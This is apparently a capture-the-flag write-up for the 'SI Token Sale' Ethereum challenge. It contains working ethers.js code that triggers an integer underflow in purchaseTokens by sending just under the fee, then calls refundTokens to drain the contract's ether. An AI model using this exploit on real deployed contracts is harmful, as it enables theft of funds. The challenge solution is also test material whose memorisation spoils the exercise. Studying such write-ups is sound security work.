# SI Token Sale

# Problem Statement
```
Game Balance: 0.3 ETH

It's finally happened!
Security Innovation is doing an ICO!
We are releasing 1000 SI Tokens (SIT) at the low low cost of 1 SIT == 1 ETH (minus a small developer fee).
We have yet to figure out what these tokens will be used for, but we are leaning towards something IOT / Machine Learning / Big Data / Cloud.
Secure your SIT today before they're gone!

----------------
|0|Purchase SIT|
----------------
Plus buyer protections!
We understand that you may be unhappy with your purchase of SIT.
For that reason, during the duration of the crowdsale you will be able to return your SIT and receive 50% of your ETH back.

--------------
|0|Refund SIT|
--------------
Viewing and Trading your Tokens
SIT is an ERC20 compliant token!
You can view and trade your tokens using MyCrypto by adding a custom token with the following parameters
Contract Address: CONTRACT_ADDRESS
Symbol: SIT
Decimals: 18
```

# Solution
Lets check our balance:
```
// using ethers.js
const contractAddress = // SITokenSale contract address
const abi = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
];
const contract = new ethers.Contract(contractAddress, abi, eoa);
const myBalance = await contract.balanceOf("YOUR_ADDRESS");
console.log(myBalance);
// returns 0
```
The first part of the vulnerability is located in the `purchaseTokens` function:
```
balances[msg.sender] += _value - feeAmount;
```
This will produce an underflow. The `feeAmount` is `10 szabo`. So all we need to do is to send `1 wei` less than `10 szabo`.
The `szabo` to `wei` conversion in this version (`0.4.24`) of solidity is:
```
1 szabo = 1000000000000 wei
```
Now that we know this, we need to trigger the fallback function call to `purchaseTokens` with `9999999999999 wei`:
```
const contractAddress = // SITokenSale contract address
const txData = {
  to: contractAddress,
  value: "9999999999999",
};
await eoa.sendTransaction(txData);
```
Now check your balance again using the previous call above. You should see:
```
1.157920892373162e+77
```
Great! We've successfully performed an underflow! Now, we just need to run `refundTokens` to drain the remaining ether in the contract:
```
const contractAddress = // SITokenSale contract address
const contractEtherBalance = await provider.getBalance(contractAddress);
console.log(contractEtherBalance);
// returns 300009999999999999
```
Since `refundTokens` divides the ethereum by half we just need to double the amount we send as the `_value`:
```

const contractAddress = // SITokenSale contract address
const abi = [
  {
    constant: false,
    inputs: [{ name: "_value", type: "uint256" }],
    name: "refundTokens",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];
const contract = new ethers.Contract(contractAddress, abi, eoa);
const tx = await contract.refundTokens("600019999999999998"); // 300009999999999999 * 2
```

We've completed this lesson!

# Key Learnings
- Be aware of underflow and overflow vulnerabilities especially with older Solidity contracts.
